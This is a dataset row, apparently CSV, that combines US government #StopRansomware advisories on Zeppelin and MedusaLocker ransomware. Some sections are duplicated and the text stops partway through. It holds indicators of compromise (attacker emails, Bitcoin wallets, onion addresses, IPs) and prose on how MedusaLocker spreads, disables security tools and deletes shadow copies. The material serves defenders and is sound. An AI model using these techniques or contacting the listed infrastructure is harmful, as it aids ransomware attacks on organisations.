0d22d3d637930e7c26a0f16513ec438243a8a01ea9c9d856acbcda61fcb7b499




 
MITRE ATT&CK TECHNIQUES
 Zeppelin actors use the ATT&CK techniques listed in Table 2.

Table 2: Zeppelin Actors Att&ck Techniques for Enterprise



Initial Access




Technique Title


ID


Use




Exploit External Remote Services


T1133


Zeppelin actors exploit RDP to gain access to victim networks.




Exploit
Public-Facing Application


T1190


Zeppelin actors exploit vulnerabilities in internet-facing systems to gain access to systems




Phishing


T1566


Zeppelin actors have used phishing and spear phishing to gain access to victims' networks.




Execution




Technique Title


ID


Use




Malicious Link


T1204.001


Zeppelin actors trick users to click a malicious link to execute malicious macros.




Malicious File Attachment


T1204.002


Zeppelin actors trick users to click a malicious attachment disguised as advertisements to execute malicious macros.




Persistence




Technique Title


ID


Use




Modify System Process


T1543.003


Zeppelin actors encrypt Windows Operating functions to preserve compromised system functions.




Impact




Technique Title


ID


Use




Data Encrypted for Impact


T1486


Zeppelin actors have encrypted data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.




 
DETECTION
Download the YARA signature for Zeppelin: YARA Signature, .yar 125 kb

Mitigations

The FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Zeppelin ransomware:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year. Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.




Require multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. 
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching SonicWall firewall vulnerabilities and known exploited vulnerabilities in internet-facing systems. Note: SonicWall maintains a vulnerability list that includes Advisory ID, CVE, and mitigation. Their list can be found at psirt.global.sonicwall.com/vuln-list. 
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. 
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. 
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege. 
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. 
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. 
Maintain offline backups of data, and regularly maintain backup and restoration.  By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data. 
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.

RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Zeppelin actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, CISA at us-cert.cisa.gov/report, or the U.S. Secret Service (USSS) at a USSS Field Office.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and the FBI do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.

References

[1] What is Zeppelin Ransomware? Steps to Prepare, Respond, and Prevent Infection (coresecurity.com)

Revisions

August 11, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1190', 'T1543.003', 'T1486', 'T1566', 'T1204.001', 'T1133', 'TA0010', 'TA0007', 'T1204.002'}","




Summary

Actions to take today to mitigate cyber threats from ransomware:

• Prioritize remediating known exploited vulnerabilities.
• Train users to recognize and report phishing attempts.
• Enable and enforce multifactor authentication.
Note: this joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known Zeppelin ransomware IOCs and TTPs associated with ransomware variants identified through FBI investigations as recently as 21 June 2022.
The FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report: pdf, 999 kb
Download the YARA signature for Zeppelin: YARA Signature.yar 125 kb
Download the IOCs: .stix 113 kb

Technical Details

Note: this advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Zeppelin ransomware is a derivative of the Delphi-based Vega malware family and functions as a Ransomware as a Service (RaaS). From 2019 through at least June 2022, actors have used this malware to target a wide range of businesses and critical infrastructure organizations, including defense contractors, educational institutions, manufacturers, technology companies, and especially organizations in the healthcare and medical industries. Zeppelin actors have been known to request ransom payments in Bitcoin, with initial amounts ranging from several thousand dollars to over a million dollars.
Zeppelin actors gain access to victim networks via RDP exploitation, exploiting SonicWall firewall vulnerabilities, and phishing campaigns,. Prior to deploying Zeppelin ransomware, actors spend one to two weeks mapping or enumerating the victim network to identify data enclaves, including cloud storage and network backups,. Zeppelin actors can deploy Zeppelin ransomware as a .dll or .exe file or contained within a PowerShell loader.,1, 
Prior to encryption, Zeppelin actors exfiltrate, sensitive company data files to sell or publish in the event the victim refuses to pay the ransom. Once the ransomware is executed, a randomized nine-digit hexadecimal number is appended to each encrypted file as a file extension, e.g., file.txt.txt.C59-E0C-929,. A note file with a ransom note is left on compromised systems, frequently on the desktop (see figure 1 below).
 



Figure 1: Sample Ransom Note

 
The FBI has observed instances where Zeppelin actors executed their malware multiple times within a victim’s network, resulting in the creation of different IDs or file extensions, for each instance of an attack; this results in the victim needing several unique decryption keys.
 
Indicators of Compromise (IOC)
See table 1 below for IOCs as of June 2022 obtained from FBI incident response investigations.

 
MITRE ATT&CK TECHNIQUES
 Zeppelin actors use the ATT&CK techniques listed in Table 2.

 
DETECTION
Download the YARA signature for Zeppelin: YARA Signature.yar 125 kb

Mitigations

The FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Zeppelin ransomware:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year. Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.




Require multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. 
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching SonicWall firewall vulnerabilities and known exploited vulnerabilities in internet-facing systems. Note: SonicWall maintains a vulnerability list that includes Advisory ID, CVE, and mitigation. Their list can be found at psirt.global.sonicwall.com/vuln-list. 
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. 
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. 
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege. 
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. 
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. 
Maintain offline backups of data, and regularly maintain backup and restoration.  By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data. 
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.

RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Zeppelin actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, CISA at us-cert.cisa.gov/report, or the U.S. Secret Service (USSS) at a USSS Field Office.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and the FBI do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.

References,1, What is Zeppelin Ransomware? Steps to Prepare, Respond, and Prevent Infection (coresecurity.com)

Revisions

August 11, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-223a
44,"




Summary

Actions to take today to mitigate cyber threats from ransomware:• Prioritize remediating known exploited vulnerabilities.• Train users to recognize and report phishing attempts.• Enable and enforce multifactor authentication.
Note: this joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Department of the Treasury, and the Financial Crimes Enforcement Network (FinCEN) are releasing this CSA to provide information on MedusaLocker ransomware. Observed as recently as May 2022, MedusaLocker actors predominantly rely on vulnerabilities in Remote Desktop Protocol (RDP) to access victims’ networks. The MedusaLocker actors encrypt the victim's data and leave a ransom note with communication instructions in every folder containing an encrypted file. The note directs victims to provide ransomware payments to a specific Bitcoin wallet address. MedusaLocker appears to operate as a Ransomware-as-a-Service (RaaS) model based on the observed split of ransom payments. Typical RaaS models involve the ransomware developer and various affiliates that deploy the ransomware on victim systems. MedusaLocker ransomware payments appear to be consistently split between the affiliate, who receives 55 to 60 percent of the ransom; and the developer, who receives the remainder. 
Download the PDF version of this report: pdf, 633 kb

Technical Details

MedusaLocker ransomware actors most often gain access to victim devices through vulnerable Remote Desktop Protocol (RDP) configurations [T1133]. Actors also frequently use email phishing and spam email campaigns—directly attaching the ransomware to the email—as initial intrusion vectors [T1566].
MedusaLocker ransomware uses a batch file to execute PowerShell script invoke-ReflectivePEInjection [T1059.001]. This script propagates MedusaLocker throughout the network by editing the EnableLinkedConnections value within the infected machine’s registry, which then allows the infected machine to detect attached hosts and networks via Internet Control Message Protocol (ICMP) and to detect shared storage via Server Message Block (SMB) Protocol. 
MedusaLocker then: 

Restarts the LanmanWorkstation service, which allows registry edits to take effect. 
Kills the processes of well-known security, accounting, and forensic software. 
Restarts the machine in safe mode to avoid detection by security software [T1562.009].
Encrypts victim files with the AES-256 encryption algorithm; the resulting key is then encrypted with an RSA-2048 public key [T1486]. 
Runs every 60 seconds, encrypting all files except those critical to the functionality of the victim’s machine and those that have the designated encrypted file extension. 
Establishes persistence by copying an executable (svhost.exe or svhostt.exe) to the %APPDATA%\Roaming directory and scheduling a task to run the ransomware every 15 minutes. 
Attempts to prevent standard recovery techniques by deleting local backups, disabling startup recovery options, and deleting shadow copies [T1490].

MedusaLocker actors place a ransom note into every folder containing a file with the victim's encrypted data. The note outlines how to communicate with the MedusaLocker actors, typically providing victims one or more email address at which the actors can be reached. The size of MedusaLocker ransom demands appears to vary depending on the victim’s financial status as perceived by the actors.  
Indicators of Compromise



Encrypted File Extensions
 
 
 




.1btc
.matlock20
.marlock02
.readinstructions


.bec
.mylock
.jpz.nz
.marlock11


.cn
.NET1
.key1
.fileslocked


.datalock
.NZ
.lock
.lockfilesUS


.deadfilesgr
.tyco
.lockdata7
.rs


.faratak
.uslockhh
.lockfiles
.tyco


.fileslock
.zoomzoom
.perfection
.uslockhh


.marlock13
n.exe
.Readinstruction
.marlock08


.marlock25
nt_lock20
.READINSTRUCTION
 


.marlock6
.marlock01
.ReadInstructions
 



 



Ransom Note File Names
 




how_to_ recover_data.html 
how_to_recover_data.html.marlock01


instructions.html 
READINSTRUCTION.html 


!!!HOW_TO_DECRYPT!!!
How_to_recovery.txt


readinstructions.html 
readme_to_recover_files


recovery_instructions.html 
HOW_TO_RECOVER_DATA.html


recovery_instruction.html
 



 



Payment Wallets




14oxnsSc1LZ5M2cPZeQ9rFnXqEvPCnZikc 


1DRxUFhvJjGUdojCzMWSLmwx7Qxn79XbJq 


18wRbb94CjyTGkUp32ZM7krCYCB9MXUq42 


1AbRxRfP6yHePpi7jmDZkS4Mfpm1ZiatH5


1Edcufenw1BB4ni9UadJpQh9LVx9JGtKpP


1DyMbw6R9PbJqfUSDcK5729xQ57yJrE8BC 


184ZcAoxkvimvVZaj8jZFujC7EwR3BKWvf 


14oH2h12LvQ7BYBufcrY5vfKoCq2hTPoev


bc1qy34v0zv6wu0cugea5xjlxagsfwgunwkzc0xcjj


bc1q9jg45a039tn83jk2vhdpranty2y8tnpnrk9k5q


bc1qz3lmcw4k58n79wpzm550r5pkzxc2h8rwmmu6xm


1AereQUh8yjNPs9Wzeg1Le47dsqC8NNaNM


1DeNHM2eTqHp5AszTsUiS4WDHWkGc5UxHf


1HEDP3c3zPwiqUaYuWZ8gBFdAQQSa6sMGw


1HdgQM9bjX7u7vWJnfErY4MWGBQJi5mVWV


1nycdn9ebxht4tpspu4ehpjz9ghxlzipll


12xd6KrWVtgHEJHKPEfXwMVWuFK4k1FCUF


1HZHhdJ6VdwBLCFhdu7kDVZN9pb3BWeUED


1PormUgPR72yv2FRKSVY27U4ekWMKobWjg


14cATAzXwD7CQf35n8Ea5pKJPfhM6jEHak


1PopeZ4LNLanisswLndAJB1QntTF8hpLsD



 



Email Addresses
 




willyhill1960@tutanota[.]com 
unlockfile@cock[.]li


zlo@keem[.]ne 
unlockmeplease@airmail[.]cc 


zlo@keemail[.]me 
unlockmeplease@protonmail[.]com 


zlo@tfwno[.]gf 
willyhill1960@protonmail[.]com 


support@ypsotecs[.]com
support@imfoodst[.]com 



 



Email Addresses
 




traceytevin@protonmail[.]com 
support@itwgset[.]com


unlock_file@aol[.]com 
support@novibmaker[.]com


unlock_file@outlook[.]com 
support@securycasts[.]com 


support@exoprints[.]com
rewmiller-1974@protonmail[.]com


support@exorints[.]com 
rpd@keemail[.]me


support@fanbridges[.]com 
soterissylla@wyseil[.]com 


support@faneridges[.]com
support@careersill[.]com 


perfection@bestkoronavirus[.]com 
karloskolorado@tutanota[.]com


pool1256@tutanota[.]com 
kevynchaz@protonmail[.]com 


rapid@aaathats3as[.]com
korona@bestkoronavirus[.]com


rescuer@tutanota[.]com
lockPerfection@gmail[.]com


ithelp01@decorous[.]cyou
lockperfection@gmail[.]com 


ithelp01@wholeness[.]business
mulierfagus@rdhos[.]com


ithelp02@decorous[.]cyou
[rescuer]@cock[.]li 


ithelp02@wholness[.]business
107btc@protonmail[.]com 


ithelpresotre@outlook[.]com
33btc@protonmail[.]com 


cmd@jitjat[.]org 
777decoder777@protonmail[.]com


coronaviryz@gmail[.]com
777decoder777@tfwno[.]gf


dec_helper@dremno[.]com
andrewmiller-1974@protonmail[.]com


dec_helper@excic[.]com 
angelomartin-1980@protonmail[.]com


dec_restore@prontonmail[.]com 
ballioverus@quocor[.]com


dec_restore1@outlook[.]com
beacon@jitjat[.]org


bitcoin@sitesoutheat[.]com 
beacon@msgsafe[.]io


briansalgado@protonmail[.]com
best666decoder@tutanota[.]com 


bugervongir@outlook[.]com
bitcoin@mobtouches[.]com 


best666decoder@protonmail[.]com 
encrypt2020@outlook[.]com 


decoder83540@cock[.]li
fast-help@inbox[.]lv


decra2019@gmail[.]com 
fuc_ktheworld1448@outlook[.]com


diniaminius@winrof[.]com 
fucktheworld1448@cock[.]li


dirhelp@keemail[.]me 
gartaganisstuffback@gmail[.]com 



 



Email Addresses
 




emaila.elaich@iav.ac[.]ma
gavingonzalez@protonmail[.]com


emd@jitjat[.]org
gsupp@onionmail[.]org


encrypt2020@cock[.]li 
gsupp@techmail[.]info


best666decoder@protonmail[.]com 
helper@atacdi[.]com 


ithelp@decorous[.]cyou
helper@buildingwin[.]com 


ithelp@decorous[.]cyoum
helprestore@outlook[.]com


ithelp@wholeness[.]business
helptorestore@outlook[.]com



 



TOR Addresses




http://gvlay6u4g53rxdi5.onion/6-iSm1B1Ehljh8HYuXGym4Xyu1WdwsR2Av-6tXiw1BImsqoLh7pd207Rl6XYoln7sId 


http://gvlay6u4g53rxdi5.onion/8-grp514hncgblilsjtd32hg6jtbyhlocr5pqjswxfgf2oragnl3pqno6fkqcimqin


http://gvlay6y4g53rxdi5.onion/21-8P4ZLCsMETPaLw9MkSlXJsNZWdHe0rxjt-XmBgZLWlm5ULGFCOJFuVdEymmxysofwu


http://gvlay6u4g53rxdi5.onion/2l-8P4ZLCsMTPaLw9MkSlXJsNZWdHeOrxjtE9lck1MuXPYo29daQys6gomZZXUImN7Z 


http://gvlay6u4g53rxdi5.onion/21-8P4ZLCsMTPaLw9MkSlXJsNZWdHe0rxjt-DcaE9HeHywqSHvdcIwOndCS4PuWASX8g 


http://gvlay6u4g53rxdi5.onion/21-8P4ZLCsMTPaLw9MkSlXJsNZWdHe0rxjt-kB4rQXGKyxGiLyw7YDsMKSBjyfdwcyxo


http://gvlay6u4g53rxdi5.onion/21-8P4ZLCsMTPaLw9MkSlXJsNZWdHe0rxjt-bET6JbB9vEMZ7qYBPqUMCxOQExFx4iOi 


http://gvlay6u4g53rxdi5. onion/8-MO0Q7O97Hgxvm1YbD7OMnimImZJXEWaG-RbH4TvdwVTGQB3X6VOUOP3lgO6YOJEOW


http://gvlay6u4g53rxdi5.onion/8-gRp514hncgb1i1sjtD32hG6jTbUh1ocR-Uola2Fo30KTJvZX0otYZgTh5txmKwUNe 


http://gvlay6u4g53rxdi5.onion/21-E6UQFCEuCn4KvtAh4TonRTpyHqFo6F6L-OWQwD1w1Td7hY7IGUUjxmHMoFSQW6blg 


http://gvlay6u4g53rxdi5.onion/21-E6UQFCEuCn4KvtAh4TonRTpyHqFo6F6L-uGHwkkWCoUtBbZWN50sSS4Ds8RABkrKy 


http://gvlay6u4g53rxdi5.onion/21-E6UQFCEuCn4KvtAh4TonRTpyHqFo6F6L-Tj3PRnQlpHc9OftRVDGAWUulvE80yZbc 


http://gvlay6u4g53rxdi5.onion/8-Ww5sCBhsL8eM4PeAgsfgfa9lrqa81r31-tDQRZCAUe4164X532j9Ky16IBN9StWTH 


http://gvlay6u4g53rxdi5.onion/21-wIq5kK9gGKiTmyups1U6fABj1VnXIYRB-I5xek6PG2EbWlPC7C1rXfsqJBlWlFFfY


qd7pcafncosqfqu3ha6fcx4h6sr7tzwagzpcdcnytiw3b6varaeqv5yd.onion


http://medusacegu2ufmc3kx2kkqicrlcxdettsjcenhjena6uannk5f4ffuyd.onion/leakdata/[REDACTED]



Disclaimer: Many of these observed IP addresses are several years old and have been historically linked to MedusaLocker ransomware. We recommend these IP addresses be investigated or vetted by organizations prior to taking action, such as blocking.



IP Address
Last Observed




195.123.246.138
Nov-2021


138.124.186.221
Nov-2021


159.223.0.9
Nov-2021


45.146.164.141
Nov-2021


185.220.101.35
Nov-2021


185.220.100.249
Sep-2021


50.80.219.149
Sep-2021


185.220.101.146
Sep-2021


185.220.101.252
Sep-2021


179.60.150.97
Sep-2021


84.38.189.52
Sep-2021


94.232.43.63
Jul-2021


108.11.30.103
Apr-2021


194.61.55.94
Apr-2021


198.50.233.202
Apr-2021


40.92.90.105
Jan-2021


188.68.216.23
Dec-2020


87.251.75.71
Dec-2020


196.240.57.20
Oct-2020


198.0.198.5
Aug-2020


194.5.220.122
Mar-2020


194.5.250.124
Mar-2020


194.5.220.124
Mar-2020


104.210.72.161
Nov-2019



 
MITRE ATT&CK Techniques
MedusaLocker actors use the ATT&CK techniques listed in Table 1.
Table 1: MedusaLocker Actors ATT&CK Techniques for Enterprise



Initial Access
 
 




Technique Title
ID
Use


External Remote Services
T1133
MedusaLocker actors gained access to victim devices through vulnerable RDP configurations.


Phishing
T1566
MedusaLocker actors used phishing and spearphishing to obtain access to victims' networks.


Execution
 
 


Technique Title
ID
Use


Command and Scripting Interpreter: PowerShell
T1059.001
MedusaLocker actors may abuse PowerShell commands and scripts for execution.


Defense Evasion
 
 


Technique Title
ID
Use


Impair Defenses: Safe Mode Boot
T1562.009
MedusaLocker actors may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services.


Impact
 
 


Technique Title
ID
Use


Data Encrypted for Impact
T1486
MedusaLocker actors encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.


Inhibit System Recovery
T1490
MedusaLocker actors may deny access to operating systems containing features that can help fix corrupted systems, such as backup catalog, volume shadow copies, and automatic repair.



 

Mitigations


Implement a recovery plan that maintains and retains multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, or the cloud).
Implement network segmentation and maintain offline backups of data to ensure limited interruption to the organization.
Regularly back up data and password protect backup copies stored offline. Ensure copies of critical data are not accessible for modification or deletion from the system where the data resides.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Install updates for operating systems, software, and firmware as soon as possible.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege. 
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Enforce multifactor authentication (MFA).
Use National Institute of Standards and Technology (NIST) standards for developing and managing password policies:

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords.
Implement multiple failed login attempt account lockouts.
Disable password “hints”.
Refrain from requiring password changes unless there is evidence of password compromise. Note: NIST guidance suggests favoring longer passwords and no longer require regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Only use secure networks; avoid using public Wi-Fi networks.
Consider installing and using a virtual private network (VPN) to establish secure remote connections.
Focus on cybersecurity awareness and training. Regularly provide users with training on information security principles and techniques as well as overall emerging cybersecurity risks and vulnerabilities, such as ransomware and phishing scams.

 Resources

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment

Reporting

To report an incident and request technical assistance, contact CISA at Central@cisa.dhs.gov or 888-282-0870, or FBI through a local field office. 
Financial Institutions must ensure compliance with any applicable Bank Secrecy Act requirements, including suspicious activity reporting obligations. Indicators of compromise (IOCs), such as suspicious email addresses, file names, hashes, domains, and IP addresses, can be provided under Item 44 of the Suspicious Activity Report (SAR) form. For more information on mandatory and voluntary reporting of cyber events via SARs, see FinCEN Advisory FIN-2016-A005, Advisory to Financial Institutions on Cyber-Events and Cyber-Enabled Crime, October 25, 2016; and FinCEN Advisory FIN-2021-A004, Advisory on Ransomware and the Use of the Financial System to Facilitate Ransom Payments, November 8, 2021, which updates FinCEN Advisory FIN-2020-A006.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.


Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field-offices. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To report incidents and anomalous activity or to request incident response resources or technical assistance related to this threat, contact CISA at SayCISA@cisa.dhs.gov.

Revisions

June 30, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1486', 'T1566', 'T1133', 'T1562.009', 'T1490', 'T1059.001'}","




Summary

Actions to take today to mitigate cyber threats from ransomware:• Prioritize remediating known exploited vulnerabilities.• Train users to recognize and report phishing attempts.• Enable and enforce multifactor authentication.
Note: this joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Department of the Treasury, and the Financial Crimes Enforcement Network (FinCEN) are releasing this CSA to provide information on MedusaLocker ransomware. Observed as recently as May 2022, MedusaLocker actors predominantly rely on vulnerabilities in Remote Desktop Protocol (RDP) to access victims’ networks. The MedusaLocker actors encrypt the victim's data and leave a ransom note with communication instructions in every folder containing an encrypted file. The note directs victims to provide ransomware payments to a specific Bitcoin wallet address. MedusaLocker appears to operate as a Ransomware-as-a-Service (RaaS) model based on the observed split of ransom payments. Typical RaaS models involve the ransomware developer and various affiliates that deploy the ransomware on victim systems. MedusaLocker ransomware payments appear to be consistently split between the affiliate, who receives 55 to 60 percent of the ransom; and the developer, who receives the remainder. 
Download the PDF version of this report: pdf, 633 kb

Technical Details

MedusaLocker ransomware actors most often gain access to victim devices through vulnerable Remote Desktop Protocol (RDP) configurations,. Actors also frequently use email phishing and spam email campaigns—directly attaching the ransomware to the email—as initial intrusion vectors,.
MedusaLocker ransomware uses a batch file to execute PowerShell script invoke-ReflectivePEInjection,. This script propagates MedusaLocker throughout the network by editing the EnableLinkedConnections value within the infected machine’s registry, which then allows the infected machine to detect attached hosts and networks via Internet Control Message Protocol (ICMP) and to detect shared storage via Server Message Block (SMB) Protocol. 
MedusaLocker then: 

Restarts the LanmanWorkstation service, which allows registry edits to take effect. 
Kills the processes of well-known security, accounting, and forensic software. 
Restarts the machine in safe mode to avoid detection by security software,.
Encrypts victim files with the AES-256 encryption algorithm; the resulting key is then encrypted with an RSA-2048 public key,. 
Runs every 60 seconds, encrypting all files except those critical to the functionality of the victim’s machine and those that have the designated encrypted file extension. 
Establishes persistence by copying an executable (svhost.exe or svhostt.exe) to the %APPDATA%\Roaming directory and scheduling a task to run the ransomware every 15 minutes. 
Attempts to prevent standard recovery techniques by deleting local backups, disabling startup recovery options, and deleting shadow copies,.

